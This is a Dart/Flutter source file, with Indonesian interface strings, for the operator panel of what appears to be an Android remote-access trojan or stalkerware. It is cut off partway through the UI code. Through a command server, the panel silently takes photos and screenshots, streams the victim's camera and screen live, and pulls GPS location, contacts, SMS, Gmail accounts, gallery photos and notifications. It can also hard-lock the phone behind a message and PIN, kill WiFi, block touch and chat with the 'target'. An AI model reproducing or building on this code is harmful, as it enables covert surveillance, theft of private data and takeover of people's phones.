import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'app_theme.dart';
import 'api_config.dart';

// ═══════════════════════════════════════════════════════════
// REUSABLE COMPONENTS
// ═══════════════════════════════════════════════════════════

/// Static LED
class _Led extends StatelessWidget {
  final Color color;
  final double size;
  const _Led({required this.color, this.size = 7});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        color: color,
        boxShadow: [
          BoxShadow(
            color: color.withOpacity(0.7),
            blurRadius: size,
            spreadRadius: 0.5,
          ),
          BoxShadow(
            color: color.withOpacity(0.4),
            blurRadius: size * 2,
            spreadRadius: 1,
          ),
        ],
      ),
    );
  }
}

/// Small rivet
class _Rivet extends StatelessWidget {
  final AppPalette C;
  final double size;
  const _Rivet({required this.C, this.size = 5});
  @override
  Widget build(BuildContext context) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [C.accentHi, C.primaryLo],
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.5),
            offset: const Offset(1, 1),
            blurRadius: 1,
          ),
        ],
      ),
    );
  }
}

/// Small screw
class _Screw extends StatelessWidget {
  final AppPalette C;
  final double size;
  const _Screw({required this.C, this.size = 10});
  @override
  Widget build(BuildContext context) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [C.text, C.bgDark],
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.6),
            offset: const Offset(1, 1),
            blurRadius: 2,
          ),
        ],
      ),
      child: Center(
        child: Container(
          width: size * 0.6,
          height: 1.2,
          color: Colors.black.withOpacity(0.7),
        ),
      ),
    );
  }
}

/// Soft metal panel
class _SoftPanel extends StatelessWidget {
  final AppPalette C;
  final Widget child;
  final EdgeInsets padding;
  final double radius;
  final Color? accent;
  const _SoftPanel({
    required this.C,
    required this.child,
    this.padding = const EdgeInsets.all(14),
    this.radius = 12,
    this.accent,
  });

  @override
  Widget build(BuildContext context) {
    final accentColor = accent ?? C.textSub;
    return Container(
      padding: padding,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(radius),
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [C.bg, C.bgDark],
        ),
        border: Border.all(color: accentColor, width: 1.2),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.55),
            offset: const Offset(0, 4),
            blurRadius: 8,
          ),
          BoxShadow(
            color: Colors.white.withOpacity(0.06),
            offset: const Offset(-1, -1),
            blurRadius: 2,
          ),
        ],
      ),
      child: child,
    );
  }
}

/// Inset panel
class _SoftInset extends StatelessWidget {
  final AppPalette C;
  final Widget child;
  final EdgeInsets padding;
  const _SoftInset({
    required this.C,
    required this.child,
    this.padding = const EdgeInsets.symmetric(horizontal: 12),
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: padding,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(8),
        color: C.bgDeep,
        border: Border.all(color: C.bgDark, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.8),
            offset: const Offset(0, 1),
            blurRadius: 2,
          ),
          BoxShadow(
            color: Colors.white.withOpacity(0.04),
            offset: const Offset(0, -1),
            blurRadius: 1,
          ),
        ],
      ),
      child: child,
    );
  }
}

// ═══════════════════════════════════════════════════════════
// CONTROL CENTER PAGE
// ═══════════════════════════════════════════════════════════
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({
    super.key,
    this.targetDevice,
    this.role = 'owner',
  });
  @override
  State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> {
  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
    'get_apps', 'lock_app', 'unlock_app',
  };

  bool _sending = false;
  final List<String> _log = [];

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  List<Map<String, dynamic>> _appList = [];
  bool _loadingApps = true;
  String? _adminPin = '1234';

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model =>
      widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery =>
      widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    try {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        _cmd('force_open', silent: true);
        Future.delayed(const Duration(seconds: 1), () => _getAppList());
      });
      _chatTimer =
          Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    } catch (_) {}
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0,
          '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = Colors.red}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: AppTheme.current.value.bgDark,
        content: Row(
          children: [
            _Led(color: c, size: 8),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                m,
                style: TextStyle(
                  color: AppTheme.current.value.text,
                  fontWeight: FontWeight.w700,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(8),
          side: BorderSide(color: c.withOpacity(0.6), width: 1.5),
        ),
        margin: const EdgeInsets.all(14),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // SEND COMMAND
  // ═══════════════════════════════════════════════════════════
  Future<void> _cmd(String cmd,
      {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('ID target tidak valid');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$baseUrl/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim',
              c: AppTheme.current.value.primaryHi);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) {
          _addLog('Error $cmd (${res.statusCode})');
          _toast('Target offline');
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('Conn error: $e');
        _toast('Koneksi gagal');
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // POLL RESPONSE
  // ═══════════════════════════════════════════════════════════
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http
            .get(Uri.parse('$baseUrl/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 &&
            res.body.isNotEmpty &&
            res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    final C = AppTheme.current.value;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) {
          _toast('Foto kosong');
          return;
        }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      case 'get_apps':
        final apps = d['apps'] as List? ?? [];
        _addLog('${apps.length} apps ditemukan');
        setState(() {
          _appList =
              apps.map((a) => Map<String, dynamic>.from(a)).toList();
          _loadingApps = false;
        });
        break;
      case 'lock_app':
        final appName = d['appName']?.toString() ?? 'unknown';
        final pkg = d['package']?.toString() ?? '';
        _addLog('App locked: $appName');
        setState(() {
          final i = _appList.indexWhere((a) => a['package'] == pkg);
          if (i != -1) _appList[i]['locked'] = true;
        });
        _toast('App $appName terkunci', c: C.primaryHi);
        break;
      case 'unlock_app':
        final appName = d['appName']?.toString() ?? 'unknown';
        final pkg = d['package']?.toString() ?? '';
        _addLog('App unlocked: $appName');
        setState(() {
          final i = _appList.indexWhere((a) => a['package'] == pkg);
          if (i != -1) _appList[i]['locked'] = false;
        });
        _toast('App $appName terbuka', c: C.primaryHi);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ═══════════════════════════════════════════════════════════
  // APP MANAGER
  // ═══════════════════════════════════════════════════════════
  Future<void> _getAppList() async {
    setState(() => _loadingApps = true);
    await _cmd('get_apps');

    Future.delayed(const Duration(seconds: 5), () {
      if (mounted && _appList.isEmpty && _loadingApps) {
        setState(() {
          _appList = [
            {'name': 'WhatsApp', 'package': 'com.whatsapp', 'locked': false},
            {'name': 'Telegram', 'package': 'org.telegram.messenger', 'locked': false},
            {'name': 'Instagram', 'package': 'com.instagram.android', 'locked': false},
            {'name': 'YouTube', 'package': 'com.google.android.youtube', 'locked': false},
            {'name': 'Chrome', 'package': 'com.android.chrome', 'locked': false},
            {'name': 'Gmail', 'package': 'com.google.android.gm', 'locked': false},
            {'name': 'Maps', 'package': 'com.google.android.apps.maps', 'locked': false},
            {'name': 'Spotify', 'package': 'com.spotify.music', 'locked': false},
            {'name': 'TikTok', 'package': 'com.zhiliaoapp.musically', 'locked': false},
            {'name': 'Twitter', 'package': 'com.twitter.android', 'locked': false},
          ];
          _loadingApps = false;
        });
      }
    });
  }

  void _showLockAppDialog(
      String appName, String packageName, bool isLocked) async {
    final C = AppTheme.current.value;
    if (isLocked) {
      final pinCtrl = TextEditingController();
      final result = await showDialog<String>(
        context: context,
        barrierDismissible: false,
        barrierColor: Colors.black.withOpacity(0.85),
        builder: (_) => _buildDialog(
          icon: Icons.lock_open_rounded,
          iconColor: C.primaryHi,
          title: 'UNLOCK APP',
          subtitle: 'Masukkan PIN admin untuk membuka: $appName',
          child: _SoftInset(
            C: C,
            child: TextField(
              controller: pinCtrl,
              keyboardType: TextInputType.number,
              obscureText: true,
              maxLength: 6,
              style: TextStyle(
                  color: C.text,
                  fontSize: 16,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3),
              cursorColor: C.accent,
              decoration: InputDecoration(
                labelText: 'PIN ADMIN',
                labelStyle: TextStyle(
                    color: C.accent, fontSize: 10, fontFamily: 'Orbitron'),
                border: InputBorder.none,
                counterText: '',
              ),
            ),
          ),
          actions: [
            _MetalButton(
              label: 'BATAL',
              color: C.textSub,
              height: 42,
              onTap: () => Navigator.pop(context, null),
            ),
            _MetalButton(
              label: 'UNLOCK',
              color: C.primaryHi,
              height: 42,
              icon: Icons.lock_open_rounded,
              onTap: () {
                final pin = pinCtrl.text.trim();
                if (pin.isEmpty) {
                  _toast('Masukkan PIN', c: C.accent);
                  return;
                }
                if (pin != _adminPin) {
                  _toast('PIN SALAH!', c: C.primaryHi);
                  return;
                }
                Navigator.pop(context, pin);
              },
            ),
          ],
        ),
      );
      if (result != null) {
        await _cmd('unlock_app', extra: '$appName|$packageName|$result');
        setState(() {
          final i =
              _appList.indexWhere((a) => a['package'] == packageName);
          if (i != -1) _appList[i]['locked'] = false;
        });
      }
    } else {
      final pinCtrl = TextEditingController();
      final result = await showDialog<String>(
        context: context,
        barrierDismissible: false,
        barrierColor: Colors.black.withOpacity(0.85),
        builder: (_) => _buildDialog(
          icon: Icons.lock_rounded,
          iconColor: C.primaryHi,
          title: 'LOCK APP',
          subtitle: 'Set PIN untuk mengunci: $appName',
          child: _SoftInset(
            C: C,
            child: TextField(
              controller: pinCtrl,
              keyboardType: TextInputType.number,
              obscureText: true,
              maxLength: 6,
              style: TextStyle(
                  color: C.text,
                  fontSize: 16,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3),
              cursorColor: C.accent,
              decoration: InputDecoration(
                labelText: 'PIN (4-6 digit)',
                labelStyle: TextStyle(
                    color: C.accent, fontSize: 10, fontFamily: 'Orbitron'),
                border: InputBorder.none,
                counterText: '',
              ),
            ),
          ),
          actions: [
            _MetalButton(
              label: 'BATAL',
              color: C.textSub,
              height: 42,
              onTap: () => Navigator.pop(context, null),
            ),
            _MetalButton(
              label: 'LOCK',
              color: C.primaryHi,
              height: 42,
              icon: Icons.lock_rounded,
              onTap: () {
                final pin = pinCtrl.text.trim();
                if (pin.isEmpty || pin.length < 4) {
                  _toast('PIN minimal 4 digit', c: C.accent);
                  return;
                }
                _adminPin = pin;
                Navigator.pop(context, pin);
              },
            ),
          ],
        ),
      );
      if (result != null) {
        await _cmd('lock_app', extra: '$appName|$packageName|$result');
        setState(() {
          final i =
              _appList.indexWhere((a) => a['package'] == packageName);
          if (i != -1) _appList[i]['locked'] = true;
        });
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // LIVE STREAM
  // ═══════════════════════════════════════════════════════════
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('$baseUrl/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw =
              (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms =
                  DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) {
      setState(() {
        _liveOn = false;
        _frame = null;
      });
    }
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ═══════════════════════════════════════════════════════════
  // CHAT
  // ═══════════════════════════════════════════════════════════
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$baseUrl/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs =
            (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('$baseUrl/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ═══════════════════════════════════════════════════════════
  // BUILD
  // ═══════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<AppPalette>(
      valueListenable: AppTheme.current,
      builder: (context, C, _) {
        return Scaffold(
          backgroundColor: C.bgDark,
          body: Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [C.bg, C.bgDark, C.bgDeep],
              ),
            ),
            child: SafeArea(
              child: Column(
                children: [
                  _buildHeaderBar(C),
                  Expanded(
                    child: SingleChildScrollView(
                      physics: const BouncingScrollPhysics(),
                      padding: const EdgeInsets.fromLTRB(14, 8, 14, 20),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          _buildSection(C, 'LIVE STREAM', C.primaryHi, [
                            _DeviceButton(
                              C: C,
                              label: 'Live Camera',
                              icon: Icons.videocam_rounded,
                              color: C.primaryHi,
                              onTap: () => _showCamPicker((side) {
                                _startLive('live_camera_start', side);
                                _showLiveDialog();
                              }),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Live Screen',
                              icon: Icons.desktop_windows_rounded,
                              color: C.accent,
                              onTap: () {
                                _startLive('live_screen_start', '');
                                _showLiveDialog();
                              },
                            ),
                            if (_liveOn)
                              _DeviceButton(
                                C: C,
                                label: 'Stop Live',
                                icon: Icons.stop_rounded,
                                color: C.primaryHi,
                                onTap: _stopLive,
                              ),
                          ]),
                          _buildSection(C, 'CAMERA', C.accent, [
                            _DeviceButton(
                              C: C,
                              label: 'Take Photo',
                              icon: Icons.camera_alt_rounded,
                              color: C.accent,
                              onTap: () => _showCamPicker(
                                  (s) => _cmd('take_photo', extra: s)),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Screenshot',
                              icon: Icons.screenshot_monitor,
                              color: C.primaryHi,
                              onTap: () => _cmd('get_screen'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Set Wallpaper',
                              icon: Icons.wallpaper_rounded,
                              color: C.primaryHi,
                              onTap: () => _inputDialog('Set Wallpaper',
                                  'Image URL', (v) => _cmd('set_wallpaper', extra: v)),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Strobe ON',
                              icon: Icons.flash_on_rounded,
                              color: C.accent,
                              onTap: () => _cmd('flash_strobe'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Strobe OFF',
                              icon: Icons.flash_off_rounded,
                              color: C.textSub,
                              onTap: () => _cmd('stop_strobe'),
                            ),
                          ]),
                          _buildSection(C, 'INTELLIGENCE', C.accentHi, [
                            _DeviceButton(
                              C: C,
                              label: 'Contacts',
                              icon: Icons.contacts_rounded,
                              color: C.accentHi,
                              onTap: () => _cmd('get_contacts'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'GPS Location',
                              icon: Icons.my_location_rounded,
                              color: C.primaryHi,
                              onTap: () => _cmd('get_location'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Gmail & Accounts',
                              icon: Icons.account_circle_rounded,
                              color: C.primaryHi,
                              onTap: () => _cmd('get_gmails'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'SMS Inbox',
                              icon: Icons.sms_rounded,
                              color: C.accent,
                              onTap: () => _cmd('get_sms'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Notifications',
                              icon: Icons.notifications_rounded,
                              color: C.accentHi,
                              onTap: () => _fetchNotif(),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Gallery (5 Photos)',
                              icon: Icons.photo_library_rounded,
                              color: C.primaryHi,
                              onTap: () => _cmd('get_gallery', extra: '5'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Request Notif Access',
                              icon: Icons.security_rounded,
                              color: C.textSub,
                              onTap: () => _cmd('open_notification_settings'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Touch Block',
                              icon: Icons.touch_app,
                              color: C.primaryHi,
                              onTap: _showTouchBlockDialog,
                            ),
                          ]),
                          _buildSection(C, 'AUDIO', C.accentHi, [
                            _DeviceButton(
                              C: C,
                              label: 'Play Audio',
                              icon: Icons.play_circle_rounded,
                              color: C.accent,
                              onTap: () => _inputDialog('Play Audio',
                                  'MP3 URL', (v) => _cmd('play_audio', extra: v)),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Stop Audio',
                              icon: Icons.stop_circle_rounded,
                              color: C.textSub,
                              onTap: () => _cmd('stop_audio'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Vibrate Loop',
                              icon: Icons.vibration_rounded,
                              color: C.primaryHi,
                              onTap: () => _cmd('vibrate_loop'),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Open URL',
                              icon: Icons.open_in_browser,
                              color: C.primaryHi,
                              onTap: () => _inputDialog('Open URL',
                                  'https://...', (v) => _cmd('open_url', extra: v)),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Kill WiFi',
                              icon: Icons.wifi_off_rounded,
                              color: C.accent,
                              onTap: () => _cmd('kill_wifi'),
                            ),
                          ]),
                          _buildSection(C, 'LOCK & CHAT', C.primaryHi, [
                            _DeviceButton(
                              C: C,
                              label: 'Lock Live + Chat',
                              icon: Icons.lock_rounded,
                              color: C.primaryHi,
                              onTap: _lockLiveDialog,
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Lock Device',
                              icon: Icons.lock_outline_rounded,
                              color: C.accent,
                              onTap: () => _inputDialog('Lock Device',
                                  'Pesan di layar lock', (msg) {
                                _inputDialog('PIN Unlock', '4 digit PIN',
                                    (pin) => _cmd('hard_lock', extra: '$msg|$pin'),
                                    isNumber: true, hint: '1234');
                              }),
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Unlock Device',
                              icon: Icons.lock_open_rounded,
                              color: C.primaryHi,
                              onTap: () => _cmd('unlock'),
                            ),
                          ]),
                          _buildSection(C, 'DEVICE', C.primaryHi, [
                            _DeviceButton(
                              C: C,
                              label: 'Restart Device',
                              icon: Icons.restart_alt_rounded,
                              color: C.accent,
                              onTap: _showRestartDialog,
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'Wake Up Target',
                              icon: Icons.wb_sunny_rounded,
                              color: C.primaryHi,
                              onTap: () => _cmd('force_open'),
                            ),
                          ]),
                          _buildSection(C, 'APPS MANAGER', C.primaryHi, [
                            _DeviceButton(
                              C: C,
                              label: 'Refresh Apps',
                              icon: Icons.refresh_rounded,
                              color: C.primaryHi,
                              onTap: _getAppList,
                            ),
                            _DeviceButton(
                              C: C,
                              label: 'PIN Admin',
                              icon: Icons.security_rounded,
                              color: C.accent,
                              onTap: _showChangePinDialog,
                            ),
                          ]),
                          _buildAppsPanel(C),
                          _buildSection(C, 'CHAT WITH TARGET', C.accentHi, []),
                          _buildChatPanel(C),
                          _buildSection(C, 'ACTIVITY LOG', C.textSub, []),
                          _buildLogPanel(C),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  // ═══════════════════════════════════════════════════════════
  // HEADER BAR
  // ═══════════════════════════════════════════════════════════
  Widget _buildHeaderBar(AppPalette C) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      child: Container(
        height: 60,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [C.bg, C.bgDark],
          ),
          border: Border.all(color: C.primaryHi.withOpacity(0.5), width: 1.2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.7),
              offset: const Offset(0, 4),
              blurRadius: 8,
            ),
            BoxShadow(
              color: C.primaryHi.withOpacity(0.15),
              blurRadius: 15,
              spreadRadius: 0,
            ),
          ],
        ),
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 10),
          child: Row(
            children: [
              _Screw(C: C, size: 12),
              const SizedBox(width: 8),
              _MetalIconButton(
                C: C,
                icon: Icons.arrow_back_ios_new_rounded,
                onTap: () {
                  if (_liveOn) _stopLive();
                  Navigator.pop(context);
                },
              ),
              const SizedBox(width: 10),
              _Led(color: C.primaryHi, size: 8),
              const SizedBox(width: 10),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Row(
                      children: [
                        Text(
                          'CONTROL CENTER',
                          style: TextStyle(
                            color: C.primaryHi,
                            fontSize: 13,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron',
                            letterSpacing: 1.8,
                            shadows: [
                              const Shadow(
                                color: Colors.black,
                                offset: Offset(0, 1),
                                blurRadius: 2,
                              ),
                              Shadow(
                                color: C.primaryHi,
                                offset: const Offset(0, 0),
                                blurRadius: 6,
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(width: 8),
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 6, vertical: 2),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(3),
                            color: C.primaryLo,
                            border: Border.all(
                                color: C.primaryHi.withOpacity(0.6),
                                width: 1),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              _Led(color: C.primaryHi, size: 5),
                              const SizedBox(width: 4),
                              Text(
                                '$_battery%',
                                style: TextStyle(
                                  color: C.primaryHi,
                                  fontSize: 8,
                                  fontWeight: FontWeight.w900,
                                  fontFamily: 'Orbitron',
                                  letterSpacing: 0.5,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 2),
                    Text(
                      'DEVICE: ${_model.length > 20 ? '${_model.substring(0, 20)}...' : _model}',
                      style: TextStyle(
                        color: C.text.withOpacity(0.55),
                        fontSize: 9,
                        fontFamily: 'ShareTechMono',
                        fontWeight: FontWeight.w700,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                ),
              ),
              if (_liveOn) ...[
                Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(4),
                    color: C.primaryLo,
                    border: Border.all(
                        color: C.primaryHi.withOpacity(0.6), width: 1),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      _Led(color: C.primaryHi, size: 5),
                      const SizedBox(width: 4),
                      Text(
                        '$_fps FPS',
                        style: TextStyle(
                          color: C.primaryHi,
                          fontSize: 8,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          letterSpacing: 0.5,
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 6),
              ],
              if (_sending)
                Padding(
                  padding: const EdgeInsets.only(right: 6),
                  child: SizedBox(
                    width: 16,
                    height: 16,
                    child: CircularProgressIndicator(
                      strokeWidth: 2,
                      color: C.primaryHi,
                    ),
                  ),
                ),
              _MetalIconButton(
                C: C,
                icon: Icons.refresh_rounded,
                onTap: () {
                  setState(() {});
                  _cmd('force_open', silent: true);
                },
              ),
              const SizedBox(width: 8),
              _Screw(C: C, size: 12),
            ],
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // SECTION
  // ═══════════════════════════════════════════════════════════
  Widget _buildSection(AppPalette C, String title, Color color,
      List<Widget> buttons) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 8),
          child: Row(
            children: [
              _Led(color: color, size: 7),
              const SizedBox(width: 10),
              Text(
                title,
                style: TextStyle(
                  color: C.accent,
                  fontSize: 11,
                  fontWeight: FontWeight.w900,
                  fontFamily: 'Orbitron',
                  letterSpacing: 2,
                  shadows: const [
                    Shadow(
                      color: Colors.black,
                      offset: Offset(0, 1),
                      blurRadius: 2,
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Container(
                  height: 1,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        color.withOpacity(0.5),
                        Colors.transparent,
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 8),
              _Screw(C: C, size: 10),
